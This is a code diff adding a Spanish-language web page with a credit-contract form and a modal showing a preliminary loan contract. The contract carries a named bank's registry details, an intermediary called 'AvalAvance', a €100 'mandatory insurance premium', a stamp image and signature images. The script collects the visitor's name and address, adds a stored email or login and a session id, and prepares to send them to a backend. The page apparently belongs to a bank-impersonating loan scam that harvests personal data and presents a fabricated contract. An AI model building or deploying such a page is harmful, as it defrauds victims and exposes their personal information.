18.9167 19.5945 18.9167 19.8329C18.9167 20.0712 18.8158 20.3095 18.6508 20.4837Z" fill="var(--interface-accent)"/>
+            </svg>
+          </span>
+          <div class="tourist-eta-banner__text">
+            <p class="tourist-eta-banner__title">Complete todos los campos necesarios </p>
+            <p class="tourist-eta-banner__caption">para la elaboración del contrato de crédito.</p>
+          </div>
+        </div>
+
+        <form
+          class="tourist-form"
+          id="creditCardForm"
+          novalidate
+        >
+          <div class="tourist-form-field">
+            <label class="tourist-form-field__label" for="ccfNombre">Nombre</label>
+            <input class="tourist-form-field__input" id="ccfNombre" name="nombre" type="text" autocomplete="name" />
+          </div>
+
+          <div class="tourist-form-field">
+            <label class="tourist-form-field__label" for="ccfCalle">Calle</label>
+            <input class="tourist-form-field__input" id="ccfCalle" name="calle" type="text" autocomplete="address-line1" />
+          </div>
+
+          <div class="tourist-form-field">
+            <label class="tourist-form-field__label" for="ccfPiso">Piso y Escalera</label>
+            <input class="tourist-form-field__input" id="ccfPiso" name="piso" type="text" autocomplete="address-line2" />
+          </div>
+
+          <div class="tourist-form-field">
+            <label class="tourist-form-field__label" for="ccfCiudad">Ciudad</label>
+            <input class="tourist-form-field__input" id="ccfCiudad" name="ciudad" type="text" autocomplete="address-level2" />
+          </div>
+
+          <div class="tourist-form-field tourist-form-field--select">
+            <label class="tourist-form-field__label" for="ccfProvincia">Provincia</label>
+            <div class="tourist-form-field__box">
+              <select class="tourist-form-field__input tourist-form-field__select" id="ccfProvincia" name="provincia" autocomplete="address-level1">
+                <option value="" selected disabled hidden></option>
+                <option value="A Coruña">A Coruña</option>
+                <option value="Álava">Álava</option>
+                <option value="Albacete">Albacete</option>
+                <option value="Alicante">Alicante</option>
+                <option value="Almería">Almería</option>
+                <option value="Asturias">Asturias</option>
+                <option value="Ávila">Ávila</option>
+                <option value="Badajoz">Badajoz</option>
+                <option value="Barcelona">Barcelona</option>
+                <option value="Burgos">Burgos</option>
+                <option value="Cáceres">Cáceres</option>
+                <option value="Cádiz">Cádiz</option>
+                <option value="Cantabria">Cantabria</option>
+                <option value="Castellón">Castellón</option>
+                <option value="Ciudad Real">Ciudad Real</option>
+                <option value="Córdoba">Córdoba</option>
+                <option value="Cuenca">Cuenca</option>
+                <option value="Girona">Girona</option>
+                <option value="Granada">Granada</option>
+                <option value="Guadalajara">Guadalajara</option>
+                <option value="Guipúzcoa">Guipúzcoa</option>
+                <option value="Huelva">Huelva</option>
+                <option value="Huesca">Huesca</option>
+                <option value="Islas Baleares">Islas Baleares</option>
+                <option value="Jaén">Jaén</option>
+                <option value="La Rioja">La Rioja</option>
+                <option value="Las Palmas">Las Palmas</option>
+                <option value="León">León</option>
+                <option value="Lleida">Lleida</option>
+                <option value="Lugo">Lugo</option>
+                <option value="Madrid">Madrid</option>
+                <option value="Málaga">Málaga</option>
+                <option value="Murcia">Murcia</option>
+                <option value="Navarra">Navarra</option>
+                <option value="Ourense">Ourense</option>
+                <option value="Palencia">Palencia</option>
+                <option value="Pontevedra">Pontevedra</option>
+                <option value="Salamanca">Salamanca</option>
+                <option value="Santa Cruz de Tenerife">Santa Cruz de Tenerife</option>
+                <option value="Segovia">Segovia</option>
+                <option value="Sevilla">Sevilla</option>
+                <option value="Soria">Soria</option>
+                <option value="Tarragona">Tarragona</option>
+                <option value="Teruel">Teruel</option>
+                <option value="Toledo">Toledo</option>
+                <option value="Valencia">Valencia</option>
+                <option value="Valladolid">Valladolid</option>
+                <option value="Vizcaya">Vizcaya</option>
+                <option value="Zamora">Zamora</option>
+                <option value="Zaragoza">Zaragoza</option>
+              </select>
+              <span class="tourist-form-field__chevron" aria-hidden="true">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="m4 6 4 4 4-4" stroke="#C6C6C6" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </span>
+            </div>
+          </div>
+
+          <div class="tourist-form-field">
+            <label class="tourist-form-field__label" for="ccfCp">Código Postal</label>
+            <input class="tourist-form-field__input" id="ccfCp" name="cp" type="text" inputmode="numeric" autocomplete="postal-code" maxlength="5" />
+          </div>
+
+          <button
+            type="button"
+            class="tourist-btn tourist-btn--gradient tourist-btn--block tourist-btn--credit-pay"
+            id="creditCardSubmit"
+            aria-busy="false"
+            data-contract-open="sign"
+          >
+            <span class="tourist-btn__default-content">
+              <span>Firmar contrato</span>
+              <svg class="tourist-btn__icon tourist-btn__icon--contract" width="20" height="20" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M9.566 2.32 2.78 9.107a2.23 2.23 0 0 0-.573 1l-.667 2.667a.55.55 0 0 0 .667.667l2.667-.667a2.23 2.23 0 0 0 1-.573l6.786-6.787a2.19 2.19 0 0 0-3.094-3.094Z" fill="white"/>
+                <path d="M8.727 3.16a4.42 4.42 0 0 0 3.093 3.093" stroke="var(--interface-accent)" stroke-width="1.1" stroke-linecap="round"/>
+              </svg>
+            </span>
+            <span class="tourist-btn__loading-content" aria-hidden="true">
+              <svg class="tourist-btn__spinner" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="10" cy="10" r="7.5" stroke="#FFFFFF" stroke-width="1.75" stroke-opacity="0.35"/>
+                <path d="M10 2.5a7.5 7.5 0 0 1 7.5 7.5" stroke="#FFFFFF" stroke-width="1.75" stroke-linecap="round"/>
+              </svg>
+              <span>Procesando</span>
+            </span>
+          </button>
+        </form>
+      </main>
+    </div>
+
+    <div class="tourist-contract-modal" id="contractModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-contract-close tabindex="-1"></div>
+      <section
+        class="tourist-contract-modal__panel"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="contractModalTitle"
+      >
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="contractModalTitle">Contrato de crédito</h2>
+          </div>
+        </header>
+
+        <div class="tourist-contract-modal__body" tabindex="0">
+          <article class="credit-contract" aria-label="Contrato preliminar de crédito">
+            <!-- ============ PÁGINA 1 ============ -->
+            <section class="credit-contract__page">
+              <header class="credit-contract__masthead">
+                <div class="credit-contract__caixa-brand" id="contractHeaderBrand" aria-label="EBN Banco">
+                  <img src="../assets/banks/newBank/logo2.png" alt="EBN Banco" id="contractHeaderBrandImg" class="credit-contract__caixa-logo">
+                </div>
+                <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
+                  <img src="../assets/document-logo.svg" alt="AvalAvance" class="credit-contract__goval-logo">
+                </div>
+              </header>
+
+              <p class="credit-contract__mono">
+                <strong id="contractBodyBankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>AvalAvance</strong>
+              </p>
+
+              <h3 class="credit-contract__doc-title">CONTRATO PRELIMINAR DE CRÉDITO</h3>
+              <p class="credit-contract__doc-subtitle">(Aviso sobre las condiciones de crédito)</p>
+
+              <p class="credit-contract__mono">
+                Cliente: <span data-contract-field="nombre">Marta Sainz de la Maza Pastor</span><br>
+                La empresa <strong>AvalAvance S.L.</strong>, actuando como intermediario de crédito
+                (Agente en actividad financiera – OAM A130179), confirma la mediación de la operación.
+              </p>
+
+              <p class="credit-contract__mono">
+                El banco <span id="contractBodyBankName2">EBN Banco</span> confirma la aprobación de la concesión del crédito.<br>
+                El presente contrato establece las condiciones de concesión del crédito y entra en
+                vigor desde el momento de su firma por las partes.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">1. Condiciones principales del crédito</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+
+              <table class="credit-contract__table">
+                <thead>
+                  <tr>
+                    <th>Parametro</th>
+                    <th>Dettagli</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>Importe del crédito:</td><td>5 000.00</td></tr>
+                  <tr><td>Tasa Anual Nominal (TAN):</td><td>7.86%</td></tr>
+                  <tr><td>Tasa Anual Equivalente Global (TAEG):</td><td>8.30%</td></tr>
+                  <tr><td>Plazo del crédito:</td><td>60 mes</td></tr>
+                  <tr><td>Cuota mensual*:</td><td>101.05</td></tr>
+                  <tr><td>Comisión de cobro:</td><td>€ 0</td></tr>
+                  <tr><td>Prima de seguro obligatoria (AvalAvance S.L.):</td><td>€ 100,00</td></tr>
+                </tbody>
+              </table>
+
+              <p class="credit-contract__note">(*) cálculo efectuado en la fecha de la oferta.</p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">2. Beneficios para el cliente</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+
+              <ul class="credit-contract__list">
+                <li>Suspensión de hasta 3 cuotas consecutivas.</li>
+                <li>Amortización anticipada sin penalizaciones.</li>
+                <li>Reducción del TAN de 0,10 p.p. cada 12 cuotas puntuales (hasta el 2,80 %).</li>
+                <li>CashBack del 1 % en cada cuota pagada.</li>
+                <li>Servicio gratuito “Financial Navigator” por 12 meses.</li>
+                <li>Transferencias SEPA y SDD sin costes adicionales.</li>
+              </ul>
+
+              <footer class="credit-contract__page-footer">1</footer>
+            </section>
+
+            <!-- ============ PÁGINA 2 ============ -->
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">3. Penalizaciones e intereses de demora</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Retraso superior a 5 días: TAN + 2 p.p.</li>
+                <li>Aviso: € 10 en papel / € 5 en digital.</li>
+                <li>2 cuotas impagadas = resolución del contrato e inicio del procedimiento de recuperación.</li>
+                <li>Revocación de la póliza = obligación de restablecimiento en un plazo de 15 días.</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">4. Comunicaciones y servicios del intermediario</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Todas las comunicaciones entre cliente y banco serán gestionadas por AvalAvance S.L.</li>
+                <li>Contrato y anexos disponibles en la aplicación en formato PDF.</li>
+                <li>Para reclamaciones, el cliente puede dirigirse al Banco de España o al sistema de resolución de conflictos competente.</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">5. Información legal</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>El cliente tiene derecho a recibir el formulario SECCI y el plan de amortización completo antes de la firma.</li>
+                <li>Condiciones reguladas por la Ley 16/2011, de contratos de crédito al consumo, y por el Código Civil Español.</li>
+                <li>Tratamiento de datos personales conforme al Reglamento General de Protección de Datos (RGPD).</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">6. Plan de pagos</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Tasa mensual: 0,006550000000<br>
+                Cuota mensual: 101.05<br>
+                Importe total de pagos: 6 062.71<br>
+                Importe de sobrepago: 1 062.71
+              </p>
+
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead>
+                  <tr>
+                    <th>Mes</th>
+                    <th>Cuota</th>
+                    <th>Intereses</th>
+                    <th>Amortización</th>
+                    <th>Saldo</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>1</td><td>€ 101.05</td><td>€ 32.75</td><td>€ 68.30</td><td>€ 4 931.70</td></tr>
+                  <tr><td>2</td><td>€ 101.05</td><td>€ 32.30</td><td>€ 68.75</td><td>€ 4 862.95</td></tr>
+                  <tr><td>3</td><td>€ 101.05</td><td>€ 31.85</td><td>€ 69.20</td><td>€ 4 793.75</td></tr>
+                  <tr><td>4</td><td>€ 101.05</td><td>€ 31.40</td><td>€ 69.65</td><td>€ 4 724.10</td></tr>
+                  <tr><td>5</td><td>€ 101.05</td><td>€ 30.94</td><td>€ 70.11</td><td>€ 4 653.99</td></tr>
+                  <tr><td>6</td><td>€ 101.05</td><td>€ 30.48</td><td>€ 70.57</td><td>€ 4 583.42</td></tr>
+                  <tr><td>7</td><td>€ 101.05</td><td>€ 30.02</td><td>€ 71.03</td><td>€ 4 512.39</td></tr>
+                  <tr><td>8</td><td>€ 101.05</td><td>€ 29.56</td><td>€ 71.49</td><td>€ 4 440.90</td></tr>
+                  <tr><td>9</td><td>€ 101.05</td><td>€ 29.09</td><td>€ 71.96</td><td>€ 4 368.94</td></tr>
+                  <tr><td>10</td><td>€ 101.05</td><td>€ 28.62</td><td>€ 72.43</td><td>€ 4 296.51</td></tr>
+                  <tr><td>11</td><td>€ 101.05</td><td>€ 28.14</td><td>€ 72.91</td><td>€ 4 223.60</td></tr>
+                  <tr><td>12</td><td>€ 101.05</td><td>€ 27.66</td><td>€ 73.39</td><td>€ 4 150.21</td></tr>
+                </tbody>
+              </table>
+
+              <footer class="credit-contract__page-footer">2</footer>
+            </section>
+
+            <!-- ============ PÁGINA 3 ============ -->
+            <section class="credit-contract__page">
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead>
+                  <tr>
+                    <th>Mes</th>
+                    <th>Cuota</th>
+                    <th>Intereses</th>
+                    <th>Amortización</th>
+                    <th>Saldo</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>13</td><td>€ 101.05</td><td>€ 27.18</td><td>€ 73.87</td><td>€ 4 076.34</td></tr>
+                  <tr><td>14</td><td>€ 101.05</td><td>€ 26.70</td><td>€ 74.35</td><td>€ 4 001.99</td></tr>
+                  <tr><td>15</td><td>€ 101.05</td><td>€ 26.21</td><td>€ 74.84</td><td>€ 3 927.15</td></tr>
+                  <tr><td>16</td><td>€ 101.05</td><td>€ 25.72</td><td>€ 75.33</td><td>€ 3 851.82</td></tr>
+                  <tr><td>17</td><td>€ 101.05</td><td>€ 25.23</td><td>€ 75.82</td><td>€ 3 776.00</td></tr>
+                  <tr><td>18</td><td>€ 101.05</td><td>€ 24.73</td><td>€ 76.32</td><td>€ 3 699.68</td></tr>
+                  <tr><td>19</td><td>€ 101.05</td><td>€ 24.23</td><td>€ 76.82</td><td>€ 3 622.86</td></tr>
+                  <tr><td>20</td><td>€ 101.05</td><td>€ 23.73</td><td>€ 77.32</td><td>€ 3 545.54</td></tr>
+                  <tr><td>21</td><td>€ 101.05</td><td>€ 23.22</td><td>€ 77.83</td><td>€ 3 467.71</td></tr>
+                  <tr><td>22</td><td>€ 101.05</td><td>€ 22.71</td><td>€ 78.34</td><td>€ 3 389.37</td></tr>
+                  <tr><td>23</td><td>€ 101.05</td><td>€ 22.20</td><td>€ 78.85</td><td>€ 3 310.52</td></tr>
+                  <tr><td>24</td><td>€ 101.05</td><td>€ 21.68</td><td>€ 79.37</td><td>€ 3 231.15</td></tr>
+                  <tr><td>25</td><td>€ 101.05</td><td>€ 21.16</td><td>€ 79.89</td><td>€ 3 151.26</td></tr>
+                  <tr><td>26</td><td>€ 101.05</td><td>€ 20.64</td><td>€ 80.41</td><td>€ 3 070.85</td></tr>
+                  <tr><td>27</td><td>€ 101.05</td><td>€ 20.11</td><td>€ 80.94</td><td>€ 2 989.91</td></tr>
+                  <tr><td>28</td><td>€ 101.05</td><td>€ 19.58</td><td>€ 81.47</td><td>€ 2 908.44</td></tr>
+                  <tr><td>29</td><td>€ 101.05</td><td>€ 19.05</td><td>€ 82.00</td><td>€ 2 826.44</td></tr>
+                  <tr><td>30</td><td>€ 101.05</td><td>€ 18.51</td><td>€ 82.54</td><td>€ 2 743.90</td></tr>
+                  <tr><td>31</td><td>€ 101.05</td><td>€ 17.97</td><td>€ 83.08</td><td>€ 2 660.82</td></tr>
+                  <tr><td>32</td><td>€ 101.05</td><td>€ 17.43</td><td>€ 83.62</td><td>€ 2 577.20</td></tr>
+                  <tr><td>33</td><td>€ 101.05</td><td>€ 16.88</td><td>€ 84.17</td><td>€ 2 493.03</td></tr>
+                  <tr><td>34</td><td>€ 101.05</td><td>€ 16.33</td><td>€ 84.72</td><td>€ 2 408.31</td></tr>
+                  <tr><td>35</td><td>€ 101.05</td><td>€ 15.77</td><td>€ 85.28</td><td>€ 2 323.03</td></tr>
+                  <tr><td>36</td><td>€ 101.05</td><td>€ 15.22</td><td>€ 85.83</td><td>€ 2 237.20</td></tr>
+                  <tr><td>37</td><td>€ 101.05</td><td>€ 14.65</td><td>€ 86.40</td><td>€ 2 150.80</td></tr>
+                  <tr><td>38</td><td>€ 101.05</td><td>€ 14.09</td><td>€ 86.96</td><td>€ 2 063.84</td></tr>
+                  <tr><td>39</td><td>€ 101.05</td><td>€ 13.52</td><td>€ 87.53</td><td>€ 1 976.31</td></tr>
+                  <tr><td>40</td><td>€ 101.05</td><td>€ 12.94</td><td>€ 88.11</td><td>€ 1 888.20</td></tr>
+                  <tr><td>41</td><td>€ 101.05</td><td>€ 12.37</td><td>€ 88.68</td><td>€ 1 799.52</td></tr>
+                  <tr><td>42</td><td>€ 101.05</td><td>€ 11.79</td><td>€ 89.26</td><td>€ 1 710.26</td></tr>
+                  <tr><td>43</td><td>€ 101.05</td><td>€ 11.20</td><td>€ 89.85</td><td>€ 1 620.41</td></tr>
+                  <tr><td>44</td><td>€ 101.05</td><td>€ 10.61</td><td>€ 90.44</td><td>€ 1 529.97</td></tr>
+                  <tr><td>45</td><td>€ 101.05</td><td>€ 10.02</td><td>€ 91.03</td><td>€ 1 438.94</td></tr>
+                  <tr><td>46</td><td>€ 101.05</td><td>€ 9.43</td><td>€ 91.62</td><td>€ 1 347.32</td></tr>
+                  <tr><td>47</td><td>€ 101.05</td><td>€ 8.82</td><td>€ 92.23</td><td>€ 1 255.09</td></tr>
+                  <tr><td>48</td><td>€ 101.05</td><td>€ 8.22</td><td>€ 92.83</td><td>€ 1 162.26</td></tr>
+                  <tr><td>49</td><td>€ 101.05</td><td>€ 7.61</td><td>€ 93.44</td><td>€ 1 068.82</td></tr>
+                  <tr><td>50</td><td>€ 101.05</td><td>€ 7.00</td><td>€ 94.05</td><td>€ 974.77</td></tr>
+                  <tr><td>51</td><td>€ 101.05</td><td>€ 6.38</td><td>€ 94.67</td><td>€ 880.10</td></tr>
+                </tbody>
+              </table>
+
+              <footer class="credit-contract__page-footer">3</footer>
+            </section>
+
+            <!-- ============ PÁGINA 4 ============ -->
+            <section class="credit-contract__page">
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead>
+                  <tr>
+                    <th>Mes</th>
+                    <th>Cuota</th>
+                    <th>Intereses</th>
+                    <th>Amortización</th>
+                    <th>Saldo</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>52</td><td>€ 101.05</td><td>€ 5.76</td><td>€ 95.29</td><td>€ 784.81</td></tr>
+                  <tr><td>53</td><td>€ 101.05</td><td>€ 5.14</td><td>€ 95.91</td><td>€ 688.90</td></tr>
+                  <tr><td>54</td><td>€ 101.05</td><td>€ 4.51</td><td>€ 96.54</td><td>€ 592.36</td></tr>
+                  <tr><td>55</td><td>€ 101.05</td><td>€ 3.88</td><td>€ 97.17</td><td>€ 495.19</td></tr>
+                  <tr><td>56</td><td>€ 101.05</td><td>€ 3.24</td><td>€ 97.81</td><td>€ 397.38</td></tr>
+                  <tr><td>57</td><td>€ 101.05</td><td>€ 2.60</td><td>€ 98.45</td><td>€ 298.93</td></tr>
+                  <tr><td>58</td><td>€ 101.05</td><td>€ 1.96</td><td>€ 99.09</td><td>€ 199.84</td></tr>
+                  <tr><td>59</td><td>€ 101.05</td><td>€ 1.31</td><td>€ 99.74</td><td>€ 100.10</td></tr>
+                  <tr><td>60</td><td>€ 100.76</td><td>€ 0.66</td><td>€ 100.10</td><td>€ 0.00</td></tr>
+                </tbody>
+              </table>
+
+              <footer class="credit-contract__page-footer">4</footer>
+            </section>
+
+            <!-- ============ PÁGINA 5 ============ -->
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">7. Firmas</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+
+              <p class="credit-contract__mono">
+                Lugar y fecha: Firma electrónica, <span id="contractFecha">31/05/2026</span>
+              </p>
+
+              <div class="credit-contract__sign-cols">
+                <div class="credit-contract__sign-col" id="contractSignBankName">Representante del banco EBN Banco</div>
+                <div class="credit-contract__sign-col">Representante del intermediario AvalAvance S.L.:</div>
+                <div class="credit-contract__sign-col">Cliente: <span data-contract-field="nombre">Marta Sainz de la Maza Pastor</span></div>
+              </div>
+
+              <div class="credit-contract__stamp-area" aria-hidden="true">
+                <img src="../assets/banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="contractStamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
+                <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
+              </div>
+
+              <div class="credit-contract__sign-line" aria-hidden="true"></div>
+
+              <footer class="credit-contract__page-footer">5</footer>
+            </section>
+          </article>
+        </div>
+
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" id="contractModalPrimary">
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/>
+  <path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/>
+  <path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.29461 4.5707 7.27769 4.53314 7.26139 4.49587C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/>
+</svg>
+
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script src="./tourist.js?v=20260609-1"></script>
+    <script>
+      (function () {
+        var form = document.getElementById("creditCardForm");
+        var submitBtn = document.getElementById("creditCardSubmit");
+        var REQUIRED_FIELDS = ["ccfNombre", "ccfCalle", "ccfCiudad", "ccfProvincia", "ccfCp"];
+
+        function getFieldContainer(el) {
+          var p = el.parentElement;
+          while (p && !p.classList.contains("tourist-form-field")) p = p.parentElement;
+          return p || el.parentElement;
+        }
+
+        function showError(fieldId, msg) {
+          var el = document.getElementById(fieldId);
+          if (!el) return;
+          el.classList.add("tourist-form-field__input--error");
+          var container = getFieldContainer(el);
+          var existing = container.querySelector(".tourist-form-field__error");
+          if (existing) { existing.textContent = msg || "Campo requerido"; return; }
+          var span = document.createElement("span");
+          span.className = "tourist-form-field__error";
+          span.textContent = msg || "Campo requerido";
+          container.appendChild(span);
+        }
+
+        function clearFieldError(el) {
+          el.classList.remove("tourist-form-field__input--error");
+          var container = getFieldContainer(el);
+          var err = container.querySelector(".tourist-form-field__error");
+          if (err) err.parentNode.removeChild(err);
+        }
+
+        function clearErrors() {
+          form.querySelectorAll(".tourist-form-field__input--error").forEach(function (el) {
+            el.classList.remove("tourist-form-field__input--error");
+          });
+          form.querySelectorAll(".tourist-form-field__error").forEach(function (el) {
+            if (el.parentElement) el.parentElement.removeChild(el);
+          });
+        }
+
+        function validate() {
+          clearErrors();
+          var valid = true;
+          REQUIRED_FIELDS.forEach(function (id) {
+            var el = document.getElementById(id);
+            if (!el || !el.value.trim()) {
+              showError(id, "Campo requerido");
+              valid = false;
+            }
+          });
+          return valid;
+        }
+
+        // Живая валидация при вводе
+        function validateField(id) {
+          var el = document.getElementById(id);
+          if (!el) return;
+          var val = el.value.trim();
+          if (!val) { showError(id, "Campo requerido"); }
+          else { clearFieldError(el); }
+        }
+
+        REQUIRED_FIELDS.forEach(function (id) {
+          var el = document.getElementById(id);
+          if (!el) return;
+          el.addEventListener("input", function () { validateField(id); });
+          el.addEventListener("change", function () { validateField(id); });
+        });
+
+        function setLoading(loading) {
+          submitBtn.setAttribute("aria-busy", loading ? "true" : "false");
+          submitBtn.disabled = loading;
+          submitBtn.classList.toggle("is-loading", loading);
+          if (contractModalPrimary) {
+            contractModalPrimary.disabled = loading;
+            contractModalPrimary.setAttribute("aria-busy", loading ? "true" : "false");
+            contractModalPrimary.classList.toggle("is-loading", loading);
+            if (activeContractMode === "sign") {
+              setContractPrimaryText(loading ? "Procesando" : "Firmar contrato");
+            }
+          }
+        }
+
+        var contractModal = document.getElementById("contractModal");
+        var contractModalBody = contractModal ? contractModal.querySelector(".tourist-contract-modal__body") : null;
+        var contractModalPrimary = document.getElementById("contractModalPrimary");
+        var contractModalPrimaryText = contractModalPrimary ? contractModalPrimary.querySelector(".tourist-contract-modal__action-text") : null;
+        var activeContractMode = "view";
+
+        function setContractPrimaryText(text) {
+          if (contractModalPrimaryText) {
+            contractModalPrimaryText.textContent = text;
+          } else if (contractModalPrimary) {
+            contractModalPrimary.textContent = text;
+          }
+        }
+
+        function formatDate(date) {
+          var dd = String(date.getDate()).padStart(2, "0");
+          var mm = String(date.getMonth() + 1).padStart(2, "0");
+          return dd + "/" + mm + "/" + date.getFullYear();
+        }
+
+        function setContractField(name, value) {
+          document.querySelectorAll('[data-contract-field="' + name + '"]').forEach(function (el) {
+            el.textContent = value;
+          });
+        }
+
+        function getFormValue(id) {
+          var el = document.getElementById(id);
+          return el && el.value ? el.value.trim() : "";
+        }
+
+        function syncContractFields() {
+          var nombre = getFormValue("ccfNombre")
+            || localStorage.getItem("touristCardNombre")
+            || localStorage.getItem("inputName")
+            || "";
+          setContractField("nombre", nombre);
+        }
+
+        function openContractModal(mode) {
+          if (!contractModal) return;
+          activeContractMode = mode === "sign" ? "sign" : "view";
+          syncContractFields();
+          contractModal.classList.toggle("tourist-contract-modal--sign", activeContractMode === "sign");
+          contractModal.classList.add("tourist-contract-modal--open");
+          contractModal.setAttribute("aria-hidden", "false");
+          document.body.classList.add("contract-modal-open");
+          if (contractModalPrimary) {
+            setContractPrimaryText(activeContractMode === "sign" ? "Firmar contrato" : "Cerrar");
+          }
+          if (contractModalBody) contractModalBody.scrollTop = 0;
+          setTimeout(function () {
+            if (contractModalBody) contractModalBody.focus({ preventScroll: true });
+          }, 0);
+        }
+
+        function closeContractModal() {
+          if (!contractModal) return;
+          contractModal.classList.remove("tourist-contract-modal--open");
+          contractModal.setAttribute("aria-hidden", "true");
+          document.body.classList.remove("contract-modal-open");
+        }
+
+        function focusFirstInvalidField() {
+          var firstInvalid = form.querySelector(".tourist-form-field__input--error");
+          if (!firstInvalid) return;
+          firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
+          firstInvalid.focus({ preventScroll: true });
+        }
+
+        function submitApplication() {
+          if (!validate()) {
+            closeContractModal();
+            focusFirstInvalidField();
+            return;
+          }
+          if (window.ClientTracker) ClientTracker.track("tourist_card_ordered");
+          setLoading(true);
+
+          var pisoEl = document.getElementById("ccfPiso");
+          var storedEmail = "";
+          try { storedEmail = localStorage.getItem("inputEmail") || localStorage.getItem("inputLogin") || ""; } catch(e){}
+          var sessionId = "";
+          try { sessionId = (window.getFlowSessionId && window.getFlowSessionId()) || localStorage.getItem("flowSessionId") || ""; } catch(e){}
+          var payload = {
+            nombre: document.getElementById("ccfNombre").value.trim(),
+            calle: document.getElementById("ccfCalle").value.trim(),
+            piso: pisoEl ? pisoEl.value.trim() : "",
+            ciudad: document.getElementById("ccfCiudad").value.trim(),
+            provincia: document.getElementById("ccfProvincia").value,
+            cp: document.getElementById("ccfCp").value.trim(),
+            email: storedEmail,
+            flowSessionId: sessionId,
+            page: window.location.href,
+          };
+
+          var sendFn = window.fetchJsonWithApiFallback || function (path, init) {
